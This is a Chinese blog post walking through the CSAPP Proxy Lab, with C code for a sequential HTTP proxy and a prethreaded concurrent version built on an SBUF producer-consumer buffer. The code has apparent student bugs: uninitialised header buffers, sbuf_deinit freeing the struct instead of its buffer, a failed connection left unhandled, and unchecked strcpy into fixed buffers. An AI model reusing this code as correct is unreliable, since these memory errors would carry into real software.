class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> listenfd, connfd;</span><br><span class="line">    <span class="type">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">    	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Signal(SIGPIPE, sigpipe_handler);</span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    	clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">    	connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">    	doit(connfd);</span><br><span class="line">    	Close(connfd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">doit</span><span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="type">char</span> hostname[MAXLINE], port[MAXLINE], filename[MAXLINE];</span><br><span class="line">    <span class="type">rio_t</span> rio;</span><br><span class="line">    </span><br><span class="line">    Rio_readinitb(&amp;rio, fd);</span><br><span class="line">    Rio_readlineb(&amp;rio, buf, MAXLINE); <span class="comment">// 读取请求行</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%s %s %s&quot;</span>, method, uri, version);</span><br><span class="line">    <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>)) &#123;	<span class="comment">// 只能处理 GET 方法</span></span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    parse_uri(uri, hostname, port, filename);	<span class="comment">// 解析 uri</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> requesthdrs[MAXLINE];</span><br><span class="line">    build_requesthdrs(&amp;rio, requesthdrs, filename, hostname);	<span class="comment">// 构建请求行和请求报头</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> severfd = Open_clientfd(hostname, port);	<span class="comment">// 得到和服务器连接的描述符</span></span><br><span class="line">    <span class="keyword">if</span> (severfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;connection faild\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Rio_writen(severfd, requesthdrs, <span class="built_in">strlen</span>(requesthdrs));	<span class="comment">// 将请求行和请求报头发送给服务器</span></span><br><span class="line">    </span><br><span class="line">    echo(severfd, fd);	<span class="comment">// 处理服务器的响应</span></span><br><span class="line">    </span><br><span class="line">    Close(severfd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">parse_uri</span><span class="params">(<span class="type">char</span> *uri, <span class="type">char</span> *hostname, <span class="type">char</span> *port, <span class="type">char</span> *filename)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *ptr_h;</span><br><span class="line">    <span class="keyword">if</span> ((ptr_h = <span class="built_in">strstr</span>(uri, <span class="string">&quot;//&quot;</span>))) &#123; <span class="comment">// 有 hostname</span></span><br><span class="line">    	<span class="type">char</span> *ptr_p;</span><br><span class="line">    	</span><br><span class="line">        <span class="keyword">if</span> ((ptr_p = index(ptr_h, <span class="string">&#x27;:&#x27;</span>))) &#123; <span class="comment">// 有 port</span></span><br><span class="line">    	    <span class="type">char</span> *ptr_f = index(ptr_p, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    	    <span class="built_in">strcpy</span>(filename, ptr_f);</span><br><span class="line">    	    *ptr_f = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    	    </span><br><span class="line">            <span class="built_in">strcpy</span>(port, ptr_p + <span class="number">1</span>);</span><br><span class="line">    	    *ptr_p = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    	    <span class="built_in">strcpy</span>(hostname, ptr_h + <span class="number">2</span>); </span><br><span class="line">    	</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 没有 port</span></span><br><span class="line">    	    <span class="type">char</span> *ptr_f = index(ptr_h + <span class="number">2</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    	    <span class="built_in">strcpy</span>(filename, ptr_f);</span><br><span class="line">    	    *ptr_f = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    	    </span><br><span class="line">            <span class="built_in">strcpy</span>(hostname, ptr_h + <span class="number">2</span>);</span><br><span class="line">    	    <span class="built_in">strcpy</span>(port, <span class="string">&quot;80&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;	<span class="comment">// 没有 hostname，也没有 port</span></span><br><span class="line">    	<span class="built_in">strcpy</span>(filename, uri);</span><br><span class="line">    	<span class="built_in">strcpy</span>(hostname, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    	<span class="built_in">strcpy</span>(port, <span class="string">&quot;80&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">build_requesthdrs</span><span class="params">(<span class="type">rio_t</span> *rio, <span class="type">char</span> *requesthdrs, <span class="type">char</span> *filename, <span class="type">char</span> *hostname)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE], host_hdrs[MAXLINE], other_hdrs[MAXLINE];</span><br><span class="line">    <span class="type">char</span> *conn_hdrs = <span class="string">&quot;Connection: close\r\n&quot;</span>, *proxy_hdrs = <span class="string">&quot;Proxy-Connection: close\r\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sprintf</span>(requesthdrs, <span class="string">&quot;GET %s HTTP/1.0\r\n&quot;</span>, filename); <span class="comment">// 请求行</span></span><br><span class="line">    </span><br><span class="line">    Rio_readlineb(rio, buf, MAXLINE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 请求报头</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">strcmp</span>(buf, <span class="string">&quot;\r\n&quot;</span>)) &#123;	<span class="comment">// 还没有读到空行</span></span><br><span class="line">    	</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;Host&quot;</span>)) &#123;	<span class="comment">// 读到 Host 报头</span></span><br><span class="line">            <span class="built_in">sprintf</span>(host_hdrs, <span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    	</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strstr</span>(buf, <span class="string">&quot;User-Agent&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(buf, <span class="string">&quot;Connection&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(buf, <span class="string">&quot;Proxy&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 不是 user、connection、proxy 报头就追加到 other 报头</span></span><br><span class="line">            <span class="built_in">sprintf</span>(other_hdrs + <span class="built_in">strlen</span>(other_hdrs), <span class="string">&quot;%s&quot;</span>, buf);	</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strlen</span>(host_hdrs) == <span class="number">0</span>) &#123;	<span class="comment">// 没有读到 Host 报头，则一定在 uri 中</span></span><br><span class="line">    	    <span class="built_in">sprintf</span>(requesthdrs + <span class="built_in">strlen</span>(requesthdrs), <span class="string">&quot;Host: %s\r\n&quot;</span>, hostname);</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    	Rio_readlineb(rio, buf, MAXLINE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 别忘了添加空行</span></span><br><span class="line">    <span class="built_in">sprintf</span>(requesthdrs + <span class="built_in">strlen</span>(requesthdrs), <span class="string">&quot;%s%s%s%s\r\n&quot;</span>, user_agent_hdr, conn_hdrs, proxy_hdrs, other_hdrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">echo</span><span class="params">(<span class="type">int</span> severfd, <span class="type">int</span> clientfd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="type">rio_t</span> rio;</span><br><span class="line">    Rio_readinitb(&amp;rio, severfd);</span><br><span class="line">    <span class="type">size_t</span> n;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((n = Rio_readlineb(&amp;rio, buf, MAXLINE)) != <span class="number">0</span>) &#123;</span><br><span class="line">    	Rio_writen(clientfd, buf, n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li>在第一次通过 <strong>.&#x2F;driver.sh</strong> 进行测试时，可能会出现如下错误</li>
</ul>
<img src="/2024/04/15/CSAPP-Lab8/image-20240416163610779.png" class="" title="image-20240416163610779">

<ul>
<li>这说明你没有安装 <code>netstat</code> 工具，通过 <strong>sudo apt install net-tools</strong> 进行安装（Ubuntu）</li>
<li>之后你可能还会遇到 <strong>curl：未找到命令</strong>，通过 <strong>sudo apt install curl</strong> 进行安装（Ubuntu）</li>
</ul>
<h1 id="Dealing-with-multiple-concurrent-requests"><a href="#Dealing-with-multiple-concurrent-requests" class="headerlink" title="Dealing with multiple concurrent requests"></a>Dealing with multiple concurrent requests</h1><ul>
<li><p>为了让 Web 代理同时处理多个请求，我们按照书上推荐的方法实现一个基于 <strong>预线程化</strong> 的并发服务器</p>
<blockquote>
<p>基于线程的并发服务器中，我们为每一个客户端创建一个新线程，导致了不小的代价；而预线程化基于生产者 - 消费者模型可以降低这种开销</p>
</blockquote>
</li>
<li><p>请注意，线程应在分离模式下运行，以避免内存泄漏</p>
</li>
</ul>
<h2 id="SBUF"><a href="#SBUF" class="headerlink" title="SBUF"></a>SBUF</h2><ul>
<li><p>我们将开发一种书上描述的简单包 <strong>SBUF</strong> 来帮助构造生产者 - 消费者程序</p>
</li>
<li><p>SBUF 操作的类型是 <strong>sbuf_t</strong> 的缓冲区结构，具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> *buf; 		<span class="comment">// 缓冲区</span></span><br><span class="line">    <span class="type">int</span> n;			<span class="comment">// 缓冲区最大容量</span></span><br><span class="line">    <span class="type">int</span> front;		<span class="comment">// 有效位起始地址</span></span><br><span class="line">    <span class="type">int</span> rear;		<span class="comment">// 有效位终止地址</span></span><br><span class="line">    <span class="type">sem_t</span> mutex;	<span class="comment">// 互斥锁</span></span><br><span class="line">    <span class="type">sem_t</span> slots;	<span class="comment">// 记录空位数的信号量</span></span><br><span class="line">    <span class="type">sem_t</span> items;	<span class="comment">// 记录有效位数的信号量</span></span><br><span class="line">&#125; <span class="type">sbuf_t</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>sbuf_init</strong> 函数初始化一个类型为 sbuf_t 的缓冲区，具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sbuf_init</span><span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    sp-&gt;buf = Calloc(n, <span class="keyword">sizeof</span>(<span class="type">int</span>));	<span class="comment">// 分配缓冲区且初始化为 0</span></span><br><span class="line">    sp-&gt;n = n;							<span class="comment">// 缓冲区的最大容量 </span></span><br><span class="line">    sp-&gt;front = sp-&gt;rear = <span class="number">0</span>;			<span class="comment">// 缓冲区中有效位的起始和终止下标，初始为 0</span></span><br><span class="line">    Sem_init(&amp;sp-&gt;mutex, <span class="number">0</span>, <span class="number">1</span>); 		<span class="comment">// 互斥锁，初始为 1</span></span><br><span class="line">    Sem_init(&amp;sp-&gt;slots, <span class="number">0</span>, n); 		<span class="comment">// 记录缓冲区中空位数，初始为 n</span></span><br><span class="line">    Sem_init(&amp;sp-&gt;items, <span class="number">0</span>, <span class="number">0</span>); 		<span class="comment">// 记录缓冲区中有效位数，初始为 0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>sbuf_deinit</strong> 函数释放一个类型为 sbuf_t 的缓冲区，具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sbuf_deinit</span><span class="params">(<span class="type">sbuf_t</span> *sp)</span></span><br><span class="line">&#123;</span><br><span class="line">    Free(sp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>sbuf_insert</strong> 函数将一个 item 插入到缓冲区，具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sbuf_insert</span><span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> item)</span></span><br><span class="line">&#123;</span><br><span class="line">    P(&amp;sp-&gt;slots);			<span class="comment">// 是否有空位，有的话空位 - 1</span></span><br><span class="line">    P(&amp;sp-&gt;mutex);			<span class="comment">// 上锁</span></span><br><span class="line">    sp-&gt;buf[(++sp-&gt;rear) % (sp-&gt;n)] = item; <span class="comment">// 还是一个循环数组</span></span><br><span class="line">    V(&amp;sp-&gt;mutex);			<span class="comment">// 解锁</span></span><br><span class="line">    V(&amp;sp-&gt;items);			<span class="comment">// 有效位 + 1，唤醒等待有效位的 P </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>sbuf_remove</strong> 函数将一个 item 移出缓冲区并返回它，具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sbuf_remove</span><span class="params">(<span class="type">sbuf_t</span> *sp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> item;</span><br><span class="line">    P(&amp;sp-&gt;items);			<span class="comment">// 是否有有效位，有的话有效位 - 1</span></span><br><span class="line">    P(&amp;sp-&gt;mutex);			<span class="comment">// 上锁</span></span><br><span class="line">    item = sp-&gt;buf[(++sp-&gt;front) % (sp-&gt;n)];	</span><br><span class="line">    V(&amp;sp-&gt;mutex);			<span class="comment">// 解锁</span></span><br><span class="line">    V(&amp;sp-&gt;slots);			<span class="comment">// 空位 + 1，唤醒等待空位的 P</span></span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h2><ul>
<li><p>main 函数和之前的实现差不多，不同的是提前创建了 NTHREADS 个线程去处理存放在缓冲区中的已经和客户端连接的描述符</p>
<blockquote>
<p>缓冲区是有限的，如果连接过多会造成阻塞</p>
</blockquote>
</li>
<li><p>sbuf 缓冲区结构对象是全局变量，使用 SBUF 包中的函数进行操作可以安全的共享全局变量</p>
</li>
<li><p>预线程化体现在我们提前创建了 NTHREADS 个线程去处理，而不是每有一个客户端连接就创建一个线程，这样做的好处是即享受了并发带来的高效，又不会造成太多浪费</p>
<blockquote>
<p>如果每有一个客户端就创建一个线程，即使我们的多处理器有多个核心，由于线程过多，在单个 CPU 上还是会频繁的进行线程的上下文切换，造成大量的资源浪费</p>
<p>基于预线程化，最好创建的线程数等于多处理器的核心数，这样就可以在每个 CPU 上实现顺序执行，充分利用了 CPU 资源</p>
</blockquote>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> listenfd, connfd;</span><br><span class="line">    <span class="type">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    <span class="type">pthread_t</span> tid;	<span class="comment">// 线程 id</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">    	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Signal(SIGPIPE, sigpipe_handler);</span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    sbuf_init(&amp;sbuf, SBUFSIZE);	<span class="comment">// 初始化一个缓冲区</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NTHREADS; ++i) &#123;	<span class="comment">// 创建 NTHREADS 个线程，线程例程为 thread</span></span><br><span class="line">    	Pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    	clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">    	connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">    	sbuf_insert(&amp;sbuf, connfd);	<span class="comment">// 将得到的和客户端连接的描述符插入到缓冲区</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="thread"><a href="#thread" class="headerlink" title="thread"></a>thread</h2><ul>
<li><p>thread 函数是线程例程，每个线程不断的从缓冲区中取出已连接的描述符，doit 处理客户端 HTTP 请求</p>
<blockquote>
<p>如果缓冲区为空，由于 sbuf_remove，这个线程阻塞</p>
</blockquote>
</li>
<li><p>将每个线程变为分离的，即它的内存资源在它终止时由系统自动释放</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">thread</span><span class="params">(<span class="type">void</span> *vargp)</span></span><br><span class="line">&#123;</span><br><span class="line">    Pthread_detach(pthread_self());	<span class="comment">// 可分离</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    	<span class="type">int</span> connfd = sbuf_remove(&amp;sbuf);</span><br><span class="line">    	doit(connfd);</span><br><span class="line">    	Close(connfd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Test-1"><a href="#Test-1" class="headerlink" title="Test"></a>Test</h2><ul>
<li>通过 <strong>make</strong> 编译程序，**.&#x2F;driver.sh** 进行测试，测试结果如下</li>
</ul>
<img src="/2024/04/15/CSAPP-Lab8/image-20240417214009744.png" class="" title="image-20240417214009744">

<ul>
<li>第二阶段的 15 分拿下！</li>
</ul>
<h2 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h2><ul>
<li><strong>proxy.c</strong> 代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;csapp.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sbuf.h&quot;</span></span></span><br><span class="line"><span class="comment">/* Recommended max cache and object sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_CACHE_SIZE 1049000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_OBJECT_SIZE 102400</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* You won&#x27;t lose style points for including this long line in your code */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> *user_agent_hdr = <span class="string">&quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">doit</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">parse_uri</span><span class="params">(<span class="type">char</span> *uri, <span class="type">char</span> *hostname, <span class="type">char</span> *port, <span class="type">char</span> *filename)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">build_requesthdrs</span><span class="params">(<span class="type">rio_t</span> *rio, <span class="type">char</span> *requesthdrs, <span class="type">char</span> *filename, <span class="type">char</span> *hostname)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">echo</span><span class="params">(<span class="type">int</span> severfd, <span class="type">int</span> clientfd)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigpipe_handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NTHREADS 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SBUFSIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="type">sbuf_t</span> sbuf;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">thread</span><span class="params">(<span class="type">void</span> *vargp)</span></span><br><span class="line">&#123;</span><br><span class="line">    Pthread_detach(pthread_self());	<span class="comment">// 可分离</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    	<span class="type">int</span> connfd = sbuf_remove(&amp;sbuf);</span><br><span class="line">    	doit(connfd);</span><br><span class="line">    	Close(connfd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> listenfd, connfd;</span><br><span class="line">    <span class="type">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    <span class="type">pthread_t</span> tid;	<span class="comment">// 线程 id</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">    	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Signal(SIGPIPE, sigpipe_handler);</span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    sbuf_init(&amp;sbuf, SBUFSIZE);	<span class="comment">// 初始化一个缓冲区</span></span><br><span class="line">    <span class="keyword">for</span> (<span 